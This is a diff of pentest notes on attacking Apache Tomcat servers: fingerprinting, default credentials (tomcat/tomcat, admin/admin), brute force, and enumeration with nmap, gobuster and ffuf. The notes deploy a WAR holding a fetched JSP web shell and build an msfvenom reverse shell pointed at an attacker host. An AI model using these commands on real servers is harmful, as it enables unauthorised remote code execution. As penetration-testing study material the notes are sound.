@@ -8,7 +8,7 @@ An open-source web server that hosts applications written in Java. Tomcat was in
 
 * Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version.
 * Another method of detecting a Tomcat server and version is through the `/docs` page.
-  * `curl -s http://<URL>:8080/docs/ | grep Tomcat`&#x20;
+  * `curl -s http://<URL>:8080/docs/ | grep Tomcat`
 
 <details>
 
@@ -27,7 +27,7 @@ An open-source web server that hosts applications written in Java. Tomcat was in
 * The `work` folder acts as a cache and is used to store data during runtime.
 * The **most important** file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes.
 * All compiled classes used by the application should be stored in the `WEB-INF/classes` folder. These classes might contain important business logic as well as sensitive information.
-* The `lib` folder stores the libraries needed by that particular application. The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), formerly known as `JavaServer Pages`&#x20;
+* The `lib` folder stores the libraries needed by that particular application. The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), formerly known as `JavaServer Pages`
 * The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.
 * The file shows us what each of the roles `manager-gui`, `manager-script`, `manager-jmx`, and `manager-status` provide access to.
 
@@ -36,7 +36,7 @@ An open-source web server that hosts applications written in Java. Tomcat was in
 * Default Credentials - tomcat/tomcat, admin/admin
 * `nmap -p- -sC -Pn <IP/CIDR> --open`
 * Fuzz the paths or directories
-  * `gobuster dir -u http://<URL>:8180/ -w directory-list-2.3-small.txt`&#x20;
+  * `gobuster dir -u http://<URL>:8180/ -w directory-list-2.3-small.txt`
 * We can try a password brute force attack against the login page.
 * If we are successful in logging in, we can upload a [Web Application Resource or Web Application ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_\(file_format\)) file containing a JSP web shell and obtain remote code execution on the Tomcat server.
 
@@ -50,11 +50,11 @@ An open-source web server that hosts applications written in Java. Tomcat was in
 
 * Many Tomcat installations provide a GUI interface to manage the application. which is available at `/manager/html` by default Only users assigned the `manager-gui` role are allowed to access.
 * Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application.
-* &#x20;A [JSP web shell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) or [SecurityRiskAdvisors-cmd.jsp](https://github.com/SecurityRiskAdvisors/cmd.jsp) can be downloaded and placed within the archive.
-  * `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp`  -> `zip -r backup.war cmd.jsp`&#x20;
+* A [JSP web shell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) or [SecurityRiskAdvisors-cmd.jsp](https://github.com/SecurityRiskAdvisors/cmd.jsp) can be downloaded and placed within the archive.
+  * `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp` -> `zip -r backup.war cmd.jsp`
   * `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker-IP> LPORT=<Attacker-Port> -f war -o backup.war`
 * Click on `Browse` to select the .war file and then click on `Deploy`.
-* `curl http://<URL>l:8180/backup/cmd.jsp?cmd=id`&#x20;
+* `curl http://<URL>l:8180/backup/cmd.jsp?cmd=id`
 * The [multi/http/tomcat\_mgr\_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process
 
 ### CVE-2020-1938 : Ghostcat <a href="#cve-2020-1938-ghostcat" id="cve-2020-1938-ghostcat"></a>
@@ -70,3 +70,7 @@ An open-source web server that hosts applications written in Java. Tomcat was in
   * `ffuf -w common.txt:FUZZ -u http://<IP>:8080/cgi/FUZZ.cmd`
   * `ffuf -w common.txt:FUZZ -u http://<IP>:8080/cgi/FUZZ.bat`
 * Leverage known exploits based on version
+
+### Tomact Manager ACL Bypass
+
+<figure><img src="../.gitbook/assets/Tomcat Manager - ACL Bypass.png" alt=""><figcaption></figcaption></figure>
